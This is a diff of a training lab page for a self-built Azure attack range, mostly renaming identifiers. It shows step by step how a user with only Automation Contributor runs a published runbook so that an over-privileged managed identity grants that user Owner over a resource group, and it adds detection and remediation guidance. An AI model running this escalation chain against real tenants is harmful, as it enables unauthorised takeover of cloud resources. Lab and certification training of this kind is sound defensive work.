@@ -1,15 +1,15 @@
 # AP08 — Automation Account runbook -> the over-privileged Managed Identity escalates to RG Owner
 
 - **Layer:** Azure (Automation Account - Managed Identity - RBAC — management plane / *cloud control plane*)
-- **Cost:** **~0 — NO VM, no billed compute.** The Automation Account **has no fixed cost** and includes ~**500 min/month of free job runtime** (the exercise consumes seconds); `JobLogs`/`JobStreams` ingestion into Log Analytics stays well below 0.1 GB/day (cents/month, 31 days of retention included). `./azrange.ps1 destroy` or `reset` -> 0. **Ties with AP07 at ~zero cost** (both deploy ARM without a VM); the *identity-only* AP01/AP03/AP04 are pure Entra (free, no ARM) and AP02/AP05 do bill compute (VM). *(It is not "the cheapest": it shares the cost floor with AP07.)*
+- **Cost:** **~0 — NO VM, no billed compute.** The Automation Account **has no fixed cost** and includes ~**500 min/month of free job runtime** (the exercise consumes seconds); `JobLogs`/`JobStreams` ingestion into Log Analytics stays well below 0.1 GB/day (cents/month, 31 days of retention included). `./aether.ps1 destroy` or `reset` -> 0. **Ties with AP07 at ~zero cost** (both deploy ARM without a VM); the *identity-only* AP01/AP03/AP04 are pure Entra (free, no ARM) and AP02/AP05 do bill compute (VM). *(It is not "the cheapest": it shares the cost floor with AP07.)*
 - **MITRE ATT&CK:** [T1651](https://attack.mitre.org/techniques/T1651/) (Cloud Administration Command — **primary**: run commands via an Automation runbook) - [T1098.003](https://attack.mitre.org/techniques/T1098/003/) (Account Manipulation: Additional Cloud Roles — the role assignment that grants the privileged role) - [T1078.004](https://attack.mitre.org/techniques/T1078/004/) (Valid Accounts: Cloud Accounts — the attacker persists as RG Owner)
 - **Maps to cert:** CARTP / CARTE
 - **Precondition seeded by the range** (100% Terraform, `enable_ap08 = true`):
-  - Automation Account `azrange-ap08-aa-<rand>` (output `ap08_automation_account` — **`verify.ps1` sentinel**) with a **system-assigned managed identity**. That MI is the **effective actor** of the escalation, exactly as in AP02 the actor is the MI stolen via IMDS.
-  - **The nuclear over-privilege:** the MI holds `mi_role` **over the RG** `azrange-ap08-rg` (`azurerm_role_assignment`), by default **`User Access Administrator`** (switchable to `Owner`). **Both roles include `Microsoft.Authorization/roleAssignments/write`** -> the MI can **self-assign** (or assign to a third party) a higher role over that scope.
-  - A dedicated **low-privilege** attacker `azrange-ap08-attacker@<tenant_domain>` (output `ap08_attacker_upn`, password in `ap08_attacker_password` — **sensitive**) whose **only** Azure grant is **`Automation Contributor` over the RG** (`azurerm_role_assignment`, `principal_type = "User"`). `Automation Contributor` does **not** include `roleAssignments/write`: the attacker **cannot** escalate on their own — they must **drive the MI**.
-  - **Embedded** PowerShell runbook `azrange-ap08-maintenance` (**fixed** decoy name, anchors the detection), gated by `runbook_mode` (`poc_escalation` by default - `benign_probe` - `none`). It is the **"loaded gun"**: Terraform **publishes** it, but **never fires** it (it launches no job and creates no `azurerm_automation_schedule`).
-  - **Automation data-plane** telemetry: an `azurerm_monitor_diagnostic_setting` (`azrange-ap08-automation-diag`) over the Automation Account -> categories **`JobLogs` + `JobStreams`** -> `AzureDiagnostics` table (ResourceProvider `MICROSOFT.AUTOMATION`) in `azrange-ap08-law` (output `ap08_law_name`) or in an external Sentinel (`existing_log_analytics_workspace_id`); gated by `collect_automation_logs` (default `true`).
+  - Automation Account `aether-ap08-aa-<rand>` (output `ap08_automation_account` — **`verify.ps1` sentinel**) with a **system-assigned managed identity**. That MI is the **effective actor** of the escalation, exactly as in AP02 the actor is the MI stolen via IMDS.
+  - **The nuclear over-privilege:** the MI holds `mi_role` **over the RG** `aether-ap08-rg` (`azurerm_role_assignment`), by default **`User Access Administrator`** (switchable to `Owner`). **Both roles include `Microsoft.Authorization/roleAssignments/write`** -> the MI can **self-assign** (or assign to a third party) a higher role over that scope.
+  - A dedicated **low-privilege** attacker `aether-ap08-attacker@<tenant_domain>` (output `ap08_attacker_upn`, password in `ap08_attacker_password` — **sensitive**) whose **only** Azure grant is **`Automation Contributor` over the RG** (`azurerm_role_assignment`, `principal_type = "User"`). `Automation Contributor` does **not** include `roleAssignments/write`: the attacker **cannot** escalate on their own — they must **drive the MI**.
+  - **Embedded** PowerShell runbook `aether-ap08-maintenance` (**fixed** decoy name, anchors the detection), gated by `runbook_mode` (`poc_escalation` by default - `benign_probe` - `none`). It is the **"loaded gun"**: Terraform **publishes** it, but **never fires** it (it launches no job and creates no `azurerm_automation_schedule`).
+  - **Automation data-plane** telemetry: an `azurerm_monitor_diagnostic_setting` (`aether-ap08-automation-diag`) over the Automation Account -> categories **`JobLogs` + `JobStreams`** -> `AzureDiagnostics` table (ResourceProvider `MICROSOFT.AUTOMATION`) in `aether-ap08-law` (output `ap08_law_name`) or in an external Sentinel (`existing_log_analytics_workspace_id`); gated by `collect_automation_logs` (default `true`).
   - **100% declarative: no `seed-ap08.ps1`, no `az vm run-command`, no post-apply hook** — entirely wired by Terraform, **embedded runbook included** (via inline `content`). It is **100% declarative like AP02/AP03/AP04/AP07** (no imperative *seed*), unlike AP01/AP05 which seed the *payload* with scripts (`seed-ap01.ps1` / `seed-ap05.ps1`). **What is NOT seeded:** no job execution, no schedule, no runtime role assignment — the **"exploit" is the student's action** (`Start-AzAutomationRunbook`).
 
 > **Warning — the credential lands in the `tfstate`.** The attacker's `random_password` lives in the Terraform state **in clear text and marked sensitive** (it is only exposed via the sensitive output `ap08_attacker_password`). Treat the `tfstate` as **toxic**, just like the SP client secret in AP02 or `dc_admin_password` in AP05. The repo's `.gitignore` already blocks `*.tfstate*`. *(The embedded `poc_escalation` runbook is also "live": it grants Owner the moment it runs — but Terraform only **publishes** it, never runs it; see the Exploit section.)*
@@ -44,10 +44,10 @@ The chain is `low-priv login -> (author/publish a runbook) -> Start-AzAutomation
 The pedagogical differentiator —*"I only had `Automation Contributor` and ended up Owner"*— lives in **launching the job as the low-priv**, not as the deployer. The state yields the credential:
 
 ```bash
-UPN=$(terraform output -raw ap08_attacker_upn)         # azrange-ap08-attacker@<tenant_domain>
+UPN=$(terraform output -raw ap08_attacker_upn)         # aether-ap08-attacker@<tenant_domain>
 PW=$(terraform output -raw ap08_attacker_password)     # sensitive (lives in the tfstate)
-RG=$(terraform output -raw ap08_resource_group)        # azrange-ap08-rg
-AA=$(terraform output -raw ap08_automation_account)    # azrange-ap08-aa-<rand>
+RG=$(terraform output -raw ap08_resource_group)        # aether-ap08-rg
+AA=$(terraform output -raw ap08_automation_account)    # aether-ap08-aa-<rand>
 
 az login -u "$UPN" -p "$PW"                             # ROPC: only without CA/MFA (see caveat)
 ```
@@ -67,7 +67,7 @@ az automation account show -g "$RG" -n "$AA" --query identity.principalId -o tsv
 
 # The decoy runbook already published by Terraform (runbook_mode != none):
 az automation runbook list -g "$RG" --automation-account-name "$AA" -o table
-#   -> azrange-ap08-maintenance   PowerShell   Published
+#   -> aether-ap08-maintenance   PowerShell   Published
 ```
 
 ### Step 3 — Fire the job (T1651) — the "exploit"
@@ -79,7 +79,7 @@ az automation runbook list -g "$RG" --automation-account-name "$AA" -o table
 # (the bash vars from Step 1 do not cross into a new pwsh process):
 $AA = terraform output -raw ap08_automation_account
 $RG = terraform output -raw ap08_resource_group
-$job = Start-AzAutomationRunbook -Name 'azrange-ap08-maintenance' `
+$job = Start-AzAutomationRunbook -Name 'aether-ap08-maintenance' `
          -AutomationAccountName $AA -ResourceGroupName $RG
 # Wait and read the job output (JobStreams: reveals the New-AzRoleAssignment text):
 Get-AzAutomationJob -Id $job.JobId -AutomationAccountName $AA -ResourceGroupName $RG
@@ -91,7 +91,7 @@ Get-AzAutomationJobOutput -Id $job.JobId -Stream Any `
 ```
 ```bash
 # az equivalent (automation extension):
-az automation runbook start -g "$RG" --automation-account-name "$AA" --name azrange-ap08-maintenance
+az automation runbook start -g "$RG" --automation-account-name "$AA" --name aether-ap08-maintenance
 ```
 
 **The key point:** the `New-AzRoleAssignment` is **not signed by the attacker** — it is signed by **the MI** inside the sandbox. The attacker, who only had `Automation Contributor`, has just exercised `roleAssignments/write` **by indirect delegation**.
@@ -101,9 +101,9 @@ az automation runbook start -g "$RG" --automation-account-name "$AA" --name azra
 ```bash
 RGID=$(az group show -n "$RG" --query id -o tsv)
 az role assignment list --assignee "$UPN" --scope "$RGID" -o table
-#   -> Owner   azrange-ap08-attacker@...   /subscriptions/.../resourceGroups/azrange-ap08-rg
+#   -> Owner   aether-ap08-attacker@...   /subscriptions/.../resourceGroups/aether-ap08-rg
 ```
-From here the attacker controls the entire RG (create/delete resources, grant more roles, persist). There is no `AZRANGE{...}` *flag*: **the trophy is the Owner grant itself** — the posture change from `Automation Contributor` to `Owner` **is** the demonstration.
+From here the attacker controls the entire RG (create/delete resources, grant more roles, persist). There is no `AETHER{...}` *flag*: **the trophy is the Owner grant itself** — the posture change from `Automation Contributor` to `Owner` **is** the demonstration.
 
 > **Teachable note — opportunistic data plane, unsuppressible management plane.** The `poc_escalation` runbook does **not** suppress its output, so `JobStreams` reveals the literal text `New-AzRoleAssignment ... Owner`. A stealthy attacker would add `| Out-Null` and **that** data-plane trace would vanish. But the `Microsoft.Authorization/roleAssignments/write` the MI executes on the **management plane** (`AzureActivity`) **cannot be suppressed**: it is logged no matter what (see the Detect section). The data plane is a visibility *bonus*; the control plane is the detection anchor.
 
@@ -135,7 +135,7 @@ Ordered from **root cause** (#1 kills the chain on its own) to **defense in dept
    ```powershell
    Remove-AzRoleAssignment -ObjectId <mi-principalId> `
      -RoleDefinitionName "User Access Administrator" `
-     -Scope "/subscriptions/<sub>/resourceGroups/azrange-ap08-rg"
+     -Scope "/subscriptions/<sub>/resourceGroups/aether-ap08-rg"
    ```
    > In the range = **remove (or comment out) the `azurerm_role_assignment.ap08_mi` resource** (the MI's over-priv grant) and re-apply with `enable_ap08 = true`. *(Both accepted values of `mi_role` —`UserAccessAdministrator` and `Owner`— include `roleAssignments/write`, so the fix is not changing the variable but removing the assignment.)* **There is no `seed-ap08.ps1 -Remediate`**: the path is 100% declarative (like AP07), so "fixing in-place" is **editing the Terraform** and running `terraform apply`.
 
@@ -159,7 +159,7 @@ Like AP07 and unlike AP05, **there is no imperative seed**: the in-place fix is 
 
 > **Two reset levels — do not confuse them** (same pattern as AP07).
 > **(1) In-place / pedagogical:** remove (or comment out) `azurerm_role_assignment.ap08_mi` + `terraform apply` (above) -> leaves the Automation Account and the telemetry standing to re-test attack and detection against the corrected state. **Important nuance:** this *flip* closes the **primitive** (the MI can no longer escalate), but does **not** revoke a role assignment the attacker **already** created at runtime — that Owner grant is *out-of-state*. To remove it you either delete it by hand (`az role assignment delete`) **or** use the hard reset (which destroys it with the RG — precisely because it is **RG-scoped**).
-> **(2) Hard / cost->0:** `./azrange.ps1 reset` re-applies with `enable_ap08 = false` (`count = 0`) -> Terraform **atomically destroys** the `azrange-ap08-rg` RG and, **with it**, the Automation Account + the MI + its `role_assignment` + the runbook + the LAW **and any runtime role assignment scoped to the RG** (the student's Owner *self-grant*, which is a child of the RG). **Zero *out-of-state* residue, tying with AP05/AP07** as the cleanest resets in the range — and **cleaner than AP02**, whose *self-grant* stays outside the state and must be cleaned up by hand. The technical key is the **RG scope**: a subscription `-Scope` would **survive** the RG destroy -> *out-of-state* residue + widened *blast radius*. That is why the RG scope is a **security requirement**, not a convenience (analogous to AP05's throwaway forest).
+> **(2) Hard / cost->0:** `./aether.ps1 reset` re-applies with `enable_ap08 = false` (`count = 0`) -> Terraform **atomically destroys** the `aether-ap08-rg` RG and, **with it**, the Automation Account + the MI + its `role_assignment` + the runbook + the LAW **and any runtime role assignment scoped to the RG** (the student's Owner *self-grant*, which is a child of the RG). **Zero *out-of-state* residue, tying with AP05/AP07** as the cleanest resets in the range — and **cleaner than AP02**, whose *self-grant* stays outside the state and must be cleaned up by hand. The technical key is the **RG scope**: a subscription `-Scope` would **survive** the RG destroy -> *out-of-state* residue + widened *blast radius*. That is why the RG scope is a **security requirement**, not a convenience (analogous to AP05's throwaway forest).
 
 ---
 
